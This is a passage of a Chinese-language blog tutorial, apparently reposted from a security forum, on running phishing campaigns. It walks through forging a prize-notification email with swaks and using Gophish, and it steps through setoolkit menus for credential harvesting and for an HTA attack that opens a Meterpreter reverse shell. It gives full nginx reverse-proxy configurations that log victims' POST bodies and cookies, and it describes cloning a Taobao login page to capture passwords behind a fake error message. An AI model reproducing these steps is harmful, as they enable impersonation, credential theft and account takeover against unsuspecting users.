+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">swaks的用法：<br>--from &lt;发件人的邮箱&gt; <br>--ehlo &lt;伪造邮件头&gt; <br>--body &lt;邮件正文内容&gt; <br>--header &lt;邮件头信息，subject为邮件标题&gt; <br>--data &lt;源邮件&gt; <br>--attach &lt;附件文件&gt;<br></code></pre></td></tr></table></figure>
+
+<p>给指定邮箱发送邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">swaks --to seyoulala@chacuo.net --from A公司 --ehlo 中奖通知 --body 秉承“正德厚生，臻于至善”的企业核心价值观，立足发展，真情回馈社会和客户。全体员工祝贺您在此活动中获得一等奖。再次感谢您对本公司的关信和支持，本信仅为中奖凭证，具体细节见注意事项。 --header &quot;Subject: 中奖通知&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173536-1fff73b8-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173544-246af21a-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在的邮箱都有某种检测机制，要想他人发邮件，这种方法就不太行了</p>
+<p><strong>Gophish</strong></p>
+<p>Gophish是一个开源的钓鱼工具包，自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的极大的便捷。</p>
+<p>伪造中奖通知邮件，发送附件</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173648-4a9226ca-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>效果看着还可以，文件再免杀一下就更好了</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173653-4dbca820-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二种方法，邮件正文中插入克隆网站</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173704-548695d0-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后克隆一个qq邮箱的登录页面，引诱其输入账户密码</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173709-57452eda-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173714-5a42fd06-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果对方提交输入账户密码就会在gophish中显示出来</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173723-5fe654f6-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="五、网站克隆"><a href="#五、网站克隆" class="headerlink" title="五、网站克隆"></a><strong>五、网站克隆</strong></h2><h3 id="0x01、setoolkit"><a href="#0x01、setoolkit" class="headerlink" title="0x01、setoolkit"></a><strong>0x01、setoolkit</strong></h3><p>说到克隆网站，kali上自带的setoolkit给我们提供了很大的方便，不仅可以记录用户提交的数据，还可以进行注入攻击</p>
+<h4 id="setoolkit克隆网站"><a href="#setoolkit克隆网站" class="headerlink" title="setoolkit克隆网站"></a><strong>setoolkit克隆网站</strong></h4><p>1、启动setoolkit，选者1，社工攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Social-Engineering Attacks【社工攻击(常用)】<br>   2) Penetration Testing (Fast-Track)【渗透测试（快速的）】<br>   3) Third Party Modules【第三方模块】<br>   4) Update the Social-Engineer Toolkit【更新社工工具包】<br>   5) Update SET configuration【升级配置】<br>   6) Help, Credits, and About【帮助】<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173833-89992044-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、随后选择2，web网站式攻击-钓鱼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Spear-Phishing Attack Vectors【鱼叉式网络钓鱼攻击】<br>   2) Website Attack Vectors【web网站式攻击-钓鱼(常用)】<br>   3) Infectious Media Generator【传染性木马】<br>   4) Create a Payload and Listener【创建payload和监听器】<br>   5) Mass Mailer Attack【邮件群发攻击】<br>   6) Arduino-Based Attack Vector【基于安卓的攻击】<br>   7) Wireless Access Point Attack Vector【wifi攻击】<br>   8) QRCode Generator Attack Vector【生成二维码(就普通二维码)】<br>   9) Powershell Attack Vectors【Powershell攻击】<br>  10) Third Party Modules【第三方模块】<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173843-8f5daeb4-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、选择3，凭证攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Java Applet Attack Method【java小程序攻击】<br>   2) Metasploit Browser Exploit Method【Metasploit浏览器利用】<br>   3) Credential Harvester Attack Method【凭证攻击(常用)】<br>   4) Tabnabbing Attack Method【Tabnabbing攻击】<br>   5) Web Jacking Attack Method【web劫持】<br>   6) Multi-Attack Web Method【web多重攻击】<br>   7) HTA Attack Method【HTA攻击】<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173849-92d00eb6-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、最后选择2，网站克隆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Web Templates【web模板】<br>   2) Site Cloner【克隆网站】<br>   3) Custom Import【自定义导入】<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173854-9626631c-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、ip默认即可，最后输入要克隆的站点</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173859-9924632a-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、访问攻击者的ip就可以看到克隆的站点</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173905-9c4fcc88-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>当用户输入账户密码时就会被记录</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173910-9f535742-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="setoolkit-HTA注入攻击"><a href="#setoolkit-HTA注入攻击" class="headerlink" title="setoolkit HTA注入攻击"></a><strong>setoolkit HTA注入攻击</strong></h4><p>先使用setoolkit克隆一个站点，当用户点击运行脚本的时候，会触发反弹一个Shell。</p>
+<p>1、启动setoolkit，并选择1，社工攻击</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173945-b4748a42-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、然后选择2，web网站式攻击-钓鱼</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173950-b756c9be-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、随后选择7，HTA攻击</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173955-ba0f964a-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、选择2，克隆网站</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174000-bd651810-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、输入克隆的站点，监听ip和端口默认就行，最后还需选择一个攻击载荷 Meterpreter Reverse TCP</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174005-c041b9a8-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>当攻击者访问攻击机的ip时就会弹出弹窗并且上线shell</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174010-c2e8487a-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x02、nginx反向代理克隆镜像网站"><a href="#0x02、nginx反向代理克隆镜像网站" class="headerlink" title="0x02、nginx反向代理克隆镜像网站"></a><strong>0x02、nginx反向代理克隆镜像网站</strong></h3><p>nginx有个反向代理功能，将客户端的请求均匀地分配到后端的多个业务服务器进行处理，nginx再将执行结果返回给客户端，以此来解决网站流量过大的问题。</p>
+<p>利用nginx反向代理克隆生成镜像网站就是通过反向代理将请求分发到一个不属于我们的网站去处理，最后将处理的结果再通过nginx返回给用户。</p>
+<p>1、打开nginx配置⽂件&#x2F;www&#x2F;server&#x2F;nginx&#x2F;conf&#x2F;nginx.conf ， 在http处添加以下配置，指定日志的存储内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">log_format Clonelog escape=json &#x27;&#123;$remote_addr|&#x27;<br>    &#x27;$request_filename|&#x27;<br>    &#x27;$request_body|&#x27;<br>    &#x27;$http_cookie|&#x27;<br>    &#x27;$http_x_forwarded_for|&#x27;<br>    &#x27;$time_local&#125;&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174040-d51ee788-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;nginx&#x2F;目录下新增clone.conf，做如下配置，生成镜像网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">server<br>&#123;<br><br>    listen 8000;<br>    server_name 127.0.0.1;<br>    index index.html index.htm index.php;<br>    access_log /www/wwwlogs/access.log Clonelog;<br><br> location / &#123;<br>    proxy_pass http://xxx.xxx.com;<br>    proxy_buffering off;<br>    proxy_set_header X-Real-Ip $remote_addr;<br>    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<br>    proxy_set_header Host &quot;xxx.xxx.com&quot;;<br>    proxy_set_header Accept-Encoding &quot;&quot;;<br>    proxy_set_header User-Agent $http_user_agent;<br>    proxy_set_header referer &quot;http://xxx.xxx.com$request_uri&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>server_name 监听的域名。</p>
+<p>access_log 设置输出⽇志的路径，最后面是我们配置的日志输出格式 。</p>
+<p>proxy_pass 反向代理的⽹站 。</p>
+<p>proxy_set_header ⽤于在向反向代理的后端 Web 服务器发起请求时 添加指定的 Header头信息。</p>
+<p>access_log 要和上⾯的nginx.conf 配置中的Clonelog 对应不然⽇志 不会起作⽤。</p>
+<p>重点是$request_body (获取post数据)，$http_cookie (获取cookie数据)这就是我们钓⻥的核⼼了。当有⼈访问并登陆我们反向代理的⽹站以 后 我们点开⽇志就可以看到他的cookie和post提交的⽤户名和密码了。</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174053-dcb5b12a-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、重新加载nginx配置文件，<code>nginx -s reload</code></p>
+<p>4、访问克隆网站，查看效果</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174104-e337c1dc-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、如果用户提交账户密码，就会被日志文件记录，日志文件位置：&#x2F;www&#x2F;wwwlogs&#x2F;access.log</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174109-e68c90c4-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x03、前端页面克隆"><a href="#0x03、前端页面克隆" class="headerlink" title="0x03、前端页面克隆"></a><strong>0x03、前端页面克隆</strong></h3><p>先找一个大型网站，带登录界面的那种，用ctrl+s将网站前端代码保存下来，再把后台功能稍加修改，这样我们的钓鱼网站在界面上差不多就可以做到以假乱真了。</p>
+<p>以某宝官网为目标</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180145-c6c7245e-1f08-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用ctrl+s把网站前端代码保存下来</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181323-66fae18a-1f0a-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是放到网站目录下访问却会出现一些偏差，密码框被拉长了</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181318-63f94e9a-1f0a-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过一番调试，需要把密码框前的标签中的id属性删除，再访问就不会有问题了  
+ </p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174143-fa55a726-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181100-11c21800-1f0a-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在两个界面除了url以外，其他的地方基本上都一样了</p>
+<p>使用F12寻找原网站的账号密码在form标签中的name值</p>
+<p>账号的name值:logonId</p>
+<p>密码的name值:password_rsainput</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180703-84597d14-1f09-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180708-8793d8e4-1f09-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>把表单内容提交到check.php，为了保证真实性，让用户在第一次输入完账户密码后弹一个“该账户不存在或登录密码出错已达上限，请更换账户。”，然后再跳转到真实网址上。</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174329-39a9b412-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是只修改这部分会出现问题，就是只能接收到账号，接收不到密码</p>
+<p>经排查，需要将密码的name值做修改，不能使用网页原来的值,这里将其修改为passwordaa，确保不会重复  
+ </p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174336-3dc88b54-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>Check.php里也需要修改</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174342-41a2f188-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>再尝试登录钓鱼网站</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180801-a71f82bc-1f09-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174353-47ed9020-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功接收到了用户输入的账号密码</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174359-4bd46e2a-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过这样用户名密码的查看并不方便，写个show.php来进行展示</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174659-b6ab700e-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174704-ba1d289a-1f06-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>为了使网站跟看起来更真实，还可以购买域名进行一些伪装</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12682?time%5C_%5C_1311=mqmhDvqIOh7D/D0l8Gk8qPODAEt+8WeD">https://xz.aliyun.com/t/12682?time\_\_1311=mqmhDvqIOh7D%2FD0l8Gk8qPODAEt%2B8WeD</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/" class="category-chain-item">钓鱼社工</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%A4%BE%E5%B7%A5/" class="print-no-link">#社工</a>
+      
